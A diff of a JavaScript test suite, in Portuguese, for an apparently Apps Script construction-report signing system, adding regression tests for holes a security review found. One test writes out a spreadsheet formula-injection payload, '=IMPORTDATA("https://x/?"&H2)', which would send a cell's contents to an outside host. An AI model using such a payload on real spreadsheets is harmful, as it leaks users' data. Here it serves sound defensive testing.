@@ -687,7 +687,9 @@ t('reenviarRDODoDiaAlvo() manda o RDO daquele dia', () => {
   ctx.DATA_ALVO_ASSINATURA = HOJE;
   depositar();
   verdade(ctx.reenviarRDODoDiaAlvo().ok);
-  eq(paraLista().length, 4);
+  // um e-mail por pessoa da lista — contado da própria lista do Code.gs,
+  // não de cabeça (a lista perdeu um endereço e o 4 fixo ficou vermelho)
+  eq(paraLista().length, ctx.RDO_EMAIL_DESTINOS.length);
 });
 
 console.log('\nDesfazer um ensaio');
@@ -1343,6 +1345,63 @@ t('outra obra não tem varredura — a assinatura online é da Teotônio', () =>
   verdade(r.ok);
   eq(r.pendentes.length, 0);
   verdade(!!r.indisponivel);
+});
+
+/* --------------------------------------------------------------------
+   AS PORTAS QUE A REVISÃO DE SEGURANÇA ACHOU ABERTAS
+   --------------------------------------------------------------------
+   Cada teste aqui é um ataque que funcionava: rodado contra o Code.gs de
+   antes, ele passa pela porta. */
+console.log('\nPortas que estavam abertas');
+
+t('link vencido vence mesmo quando a planilha guardou a hora como DATA', () => {
+  convites();
+  // a planilha converte 'yyyy-MM-dd HH:mm:ss' em Date — e o getValues() devolve Date
+  const iConv = CAB_ASSIN.indexOf('convidadoEm');
+  PLANILHA.RDO_Assinaturas.forEach(l => { l[iConv] = new Date(Date.now() - 150 * 24 * 3600 * 1000); });
+  const r = assinar('fiscalizacao');
+  verdade(!r.ok && r.vencido, 'um convite de 150 dias assinou: ' + JSON.stringify(r));
+});
+
+t('e a hora da assinatura volta em texto, não "Mon Aug 24 2026"', () => {
+  assinar('fiscalizacao');
+  const iAss = CAB_ASSIN.indexOf('assinadoEm');
+  PLANILHA.RDO_Assinaturas.forEach(l => { if (l[iAss]) l[iAss] = new Date(2026, 7, 24, 15, 30, 0); });
+  const l = linhaDe('fiscalizacao');
+  eq(l.assinadoEm, '2026-08-24 15:30:00');
+});
+
+t('sem login não se arquiva firma de engenheiro (EXIGIR_TOKEN ligado)', () => {
+  PROPS.setProperty('EXIGIR_TOKEN', 'true');
+  eq(arquivar({ token: '' }).error, 'TOKEN_INVALIDO');
+  eq(ctx.rdoFirmasArquivadasLer({}).error, 'TOKEN_INVALIDO', 'e nem se lê a firma guardada');
+  eq(linhaDe('engenheiro').status, 'pendente');
+});
+
+t('o apontador vê o andamento das firmas, mas NÃO recebe o link pessoal do fiscal', () => {
+  PROPS.setProperty('EXIGIR_TOKEN', 'true');
+  sessao('tk-campo', 'campo');
+  const r = ctx.rdoAssinaturasDoDia({ obra: 'teotonio', data: HOJE, token: 'tk-campo', imagens: '0' });
+  verdade(r.ok && r.assinaturas.length === 2, JSON.stringify(r));
+  verdade(r.assinaturas.every(a => a.link === ''), 'o link foi para o apontador');
+  sessao('tk-eng', 'engenharia');
+  const e = ctx.rdoAssinaturasDoDia({ obra: 'teotonio', data: HOJE, token: 'tk-eng', imagens: '0' });
+  verdade(e.assinaturas.every(a => /t=/.test(a.link)), 'o escritório ficou sem o link');
+});
+
+t('"RDO ASSINADO" não sai com contagem de firmas inventada pelo cliente', () => {
+  // ninguém assinou; o depósito diz que o PDF traz 2 firmas
+  const r = depositar({ assinaturas: '2' });
+  verdade(r.ok, 'o depósito em si continua valendo');
+  eq(paraLista().length, 0, 'mandou "assinado por todos" sem assinatura nenhuma');
+});
+
+t('nome digitado na página pública que começa com "=" não vira fórmula', () => {
+  const r = assinar('fiscalizacao', { nome: '=IMPORTDATA("https://x/?"&H2)' });
+  verdade(r.ok, JSON.stringify(r));
+  const iNome = CAB_ASSIN.indexOf('nomeAssinante');
+  const gravado = PLANILHA.RDO_Assinaturas.map(l => l[iNome]).filter(Boolean)[0];
+  eq(String(gravado).charAt(0), "'", 'gravou a fórmula crua: ' + gravado);
 });
 
 console.log(falhas ? `\n${falhas} falha(s)\n` : '\nTudo certo.\n');
